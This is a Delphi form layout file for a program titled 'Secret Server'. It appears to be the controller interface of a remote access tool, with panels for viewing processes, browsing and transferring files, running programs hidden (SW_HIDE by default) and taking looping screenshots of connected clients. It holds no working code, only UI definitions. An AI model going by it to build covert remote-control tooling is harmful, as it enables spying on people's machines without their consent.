object Form1: TForm1
  Left = 188
  Top = 123
  BorderIcons = [biSystemMenu, biMinimize]
  BorderStyle = bsSingle
  Caption = 'Secret Server'
  ClientHeight = 441
  ClientWidth = 390
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -13
  Font.Name = 'Calibri'
  Font.Style = []
  OldCreateOrder = False
  Position = poScreenCenter
  OnCloseQuery = FormCloseQuery
  OnShow = FormShow
  PixelsPerInch = 96
  TextHeight = 15
  object Label1: TTntLabel
    Left = 8
    Top = 40
    Width = 51
    Height = 15
    Caption = 'Server IP:'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWindowText
    Font.Height = -13
    Font.Name = 'Calibri'
    Font.Style = []
    ParentFont = False
  end
  object Label2: TTntLabel
    Left = 8
    Top = 88
    Width = 63
    Height = 15
    Caption = 'Server Port:'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWindowText
    Font.Height = -13
    Font.Name = 'Calibri'
    Font.Style = []
    ParentFont = False
  end
  object Edit1: TTntEdit
    Left = 8
    Top = 56
    Width = 89
    Height = 23
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWindowText
    Font.Height = -13
    Font.Name = 'Calibri'
    Font.Style = []
    ParentFont = False
    TabOrder = 0
  end
  object Edit2: TTntEdit
    Left = 8
    Top = 104
    Width = 89
    Height = 23
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWindowText
    Font.Height = -13
    Font.Name = 'Calibri'
    Font.Style = []
    ParentFont = False
    TabOrder = 1
    Text = '3333'
  end
  object ListBox1: TTntListBox
    Left = 104
    Top = 8
    Width = 281
    Height = 121
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWindowText
    Font.Height = -13
    Font.Name = 'Calibri'
    Font.Style = []
    ItemHeight = 15
    ParentFont = False
    ParentShowHint = False
    PopupMenu = PopupMenu3
    ShowHint = True
    TabOrder = 2
    OnClick = ListBox1Click
  end
  object Button1: TButton
    Left = 8
    Top = 8
    Width = 89
    Height = 25
    Caption = 'Start Server'
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWindowText
    Font.Height = -13
    Font.Name = 'Calibri'
    Font.Style = []
    ParentFont = False
    TabOrder = 3
    OnClick = Button1Click
  end
  object PageControl1: TPageControl
    Left = 8
    Top = 136
    Width = 377
    Height = 297
    ActivePage = TabSheet1
    Font.Charset = DEFAULT_CHARSET
    Font.Color = clWindowText
    Font.Height = -13
    Font.Name = 'Calibri'
    Font.Style = []
    ParentFont = False
    TabOrder = 4
    object TabSheet1: TTabSheet
      Caption = 'Logs'
      ImageIndex = 1
      object Memo1: TTntMemo
        Left = 0
        Top = 0
        Width = 368
        Height = 267
        Font.Charset = DEFAULT_CHARSET
        Font.Color = clWindowText
        Font.Height = -11
        Font.Name = 'Calibri'
        Font.Style = []
        ParentFont = False
        TabOrder = 0
        OnChange = Memo1Change
      end
    end
    object TabSheet2: TTabSheet
      Caption = 'Processes'
      object ListBox2: TTntListBox
        Left = 0
        Top = 0
        Width = 369
        Height = 267
        ItemHeight = 15
        ParentShowHint = False
        PopupMenu = PopupMenu1
        ShowHint = True
        TabOrder = 0
        OnDrawItem = ListBox2DrawItem
        OnKeyDown = ListBox2KeyDown
      end
    end
    object TabSheet3: TTabSheet
      Caption = 'File Explorer'
      ImageIndex = 2
      object Label3: TTntLabel
        Left = 152
        Top = 3
        Width = 27
        Height = 15
        Caption = 'Size: '
        Font.Charset = DEFAULT_CHARSET
        Font.Color = clWindowText
        Font.Height = -13
        Font.Name = 'Calibri'
        Font.Style = []
        ParentFont = False
      end
      object Label6: TTntLabel
        Left = 3
        Top = 23
        Width = 15
        Height = 15
        Caption = 'C:\'
      end
      object Label7: TTntLabel
        Left = 348
        Top = 3
        Width = 16
        Height = 15
        Alignment = taRightJustify
        Caption = '0%'
      end
      object ComboBox1: TComboBox
        Left = 0
        Top = 0
        Width = 145
        Height = 23
        Style = csDropDownList
        ItemHeight = 15
        ItemIndex = 0
        TabOrder = 0
        Text = 'C:\'
        OnChange = ComboBox1Change
        OnKeyPress = ComboBox1KeyPress
        Items.Strings = (
          'C:\'
          'D:\'
          'E:\'
          'F:\'
          'G:\'
          'I:\'
          'J:\'
          'K:\'
          'L:\'
          'M:\'
          'N:\'
          'O:\'
          'P:\'
          'Q:\'
          'R:\'
          'S:\'
          'T:\'
          'U:\'
          'V:\'
          'W:\'
          'X:\'
          'Y:\'
          'Z:\')
      end
      object ListBox3: TTntListBox
        Left = 0
        Top = 40
        Width = 369
        Height = 226
        Color = 16250613
        Font.Charset = DEFAULT_CHARSET
        Font.Color = clWindowText
        Font.Height = -13
        Font.Name = 'Calibri'
        Font.Style = []
        ItemHeight = 15
        ParentFont = False
        PopupMenu = PopupMenu2
        TabOrder = 1
        OnClick = ListBox3Click
        OnDblClick = ListBox3DblClick
        OnDrawItem = ListBox3DrawItem
        OnKeyDown = ListBox3KeyDown
      end
    end
    object TabSheet4: TTabSheet
      Caption = 'Commands'
      ImageIndex = 3
      object Label8: TTntLabel
        Left = 121
        Top = 103
        Width = 47
        Height = 15
        Caption = 'Quality: '
      end
      object Label4: TTntLabel
        Left = 88
        Top = 75
        Width = 64
        Height = 15
        Caption = 'IP Address: '
        PopupMenu = PopupMenu4
      end
      object Button2: TButton
        Left = 0
        Top = 0
        Width = 81
        Height = 21
        Caption = 'Message'
        TabOrder = 0
        OnClick = Button2Click
      end
      object Edit3: TTntEdit
        Left = 88
        Top = 0
        Width = 281
        Height = 21
        AutoSize = False
        TabOrder = 1
      end
      object Button4: TButton
        Left = 0
        Top = 24
        Width = 81
        Height = 21
        Caption = 'Terminate'
        TabOrder = 2
        OnClick = Button4Click
      end
      object Edit5: TTntEdit
        Left = 88
        Top = 24
        Width = 281
        Height = 21
        AutoSize = False
        TabOrder = 3
      end
      object Button5: TButton
        Left = 0
        Top = 48
        Width = 81
        Height = 21
        Caption = 'Execute'
        TabOrder = 4
        OnClick = Button5Click
      end
      object Edit6: TTntEdit
        Left = 88
        Top = 48
        Width = 281
        Height = 21
        AutoSize = False
        TabOrder = 5
      end
      object BitBtn1: TBitBtn
        Left = 240
        Top = 100
        Width = 73
        Height = 25
        Caption = 'Screenshot'
        TabOrder = 6
        OnClick = BitBtn1Click
      end
      object ComboBox2: TComboBox
        Left = 3
        Top = 100
        Width = 102
        Height = 23
        ItemHeight = 15
        ItemIndex = 0
        TabOrder = 7
        Text = 'SW_HIDE'
        OnKeyPress = ComboBox2KeyPress
        Items.Strings = (
          'SW_HIDE'
          'SW_SHOW'
          'SW_SHOWNORMAL'
          'SW_SHOWMAXIMIZED')
      end
      object CheckBox1: TCheckBox
        Left = 320
        Top = 104
        Width = 49
        Height = 17
        Caption = 'Loop'
        TabOrder = 8
      end
      object UpDown1: TUpDown
        Left = 204
        Top = 100
        Width = 16
        Height = 23
        Associate = Edit4
        Min = 1
        Position = 30
        TabOrder = 9
      end
      object Edit4: TTntEdit
        Left = 171
        Top = 100
        Width = 33
        Height = 23
        TabOrder = 10
        Text = '30'
        OnExit = Edit4Exit
        OnKeyPress = Edit4KeyPress
      end
      object Button3: TButton
        Left = 0
        Top = 72
        Width = 81
        Height = 21
        Caption = 'IP Address'
        TabOrder = 11
        OnClick = Button3Click
      end
    end
  end
  object ServerSocket1: TServerSocket
    Active = False
    Port = 0
    ServerType = stNonBlocking
    OnClientRead = ServerSocket1ClientRead
    OnClientError = ServerSocket1ClientError
    Left = 112
    Top = 16
  end
  object OpenDialog1: TTntOpenDialog
    Title = 'Upload File'
    Left = 112
    Top = 80
  end
  object PopupMenu1: TPopupMenu
    Left = 112
    Top = 48
    object Update1: TMenuItem
      Caption = 'Update'
      OnClick = Update1Click
    end
    object Terminate1: TMenuItem
      Caption = 'Terminate'
      OnClick = Terminate1Click
    end
  end
  object PopupMenu2: TPopupMenu
    Left = 144
    Top = 48
    object Update2: TMenuItem
      Caption = 'Update'
      OnClick = Update2Click
    end
    object CreateFolder1: TMenuItem
      Caption = 'Create Folder'
      OnClick = CreateFolder1Click
    end
    object GetFolderSize1: TMenuItem
      Caption = 'Get Folder Size'
      OnClick = GetFolderSize1Click
    end
    object Moving1: TMenuItem
      Caption = 'Operation'
      object Paste1: TMenuItem
        Caption = 'Paste'
        OnClick = Paste1Click
      end
      object Copy1: TMenuItem
        Caption = 'Copy'
        OnClick = Copy1Click
      end
      object Cut1: TMenuItem
        Caption = 'Cut'
        OnClick = Cut1Click
      end
      object Rename1: TMenuItem
        Caption = 'Rename'
        OnClick = Rename1Click
      end
      object Delete1: TMenuItem
        Caption = 'Delete'
        OnClick = Delete1Click
      end
      object Open1: TMenuItem
        Caption = 'Open'
        OnClick = Open1Click
      end
    end
    object Upload1: TMenuItem
      Caption = 'Upload'
      OnClick = Upload1Click
    end
    object Download1: TMenuItem
      Caption = 'Download'
      OnClick = Download1Click
    end
    object CopyName1: TMenuItem
      Caption = 'Copy Name'
      OnClick = CopyName1Click
    end
  end
  object SaveDialog1: TTntSaveDialog
    Title = 'Download File'
    Left = 144
    Top = 80
  end
  object PopupMenu3: TPopupMenu
    Left = 176
    Top = 48
    object Close1: TMenuItem
      Caption = 'Close'
      OnClick = Close1Click
    end
  end
  object PopupMenu4: TPopupMenu
    Left = 208
    Top = 48
    object Copy2: TMenuItem
      Caption = 'Copy'
      OnClick = Copy2Click
    end
  end
end
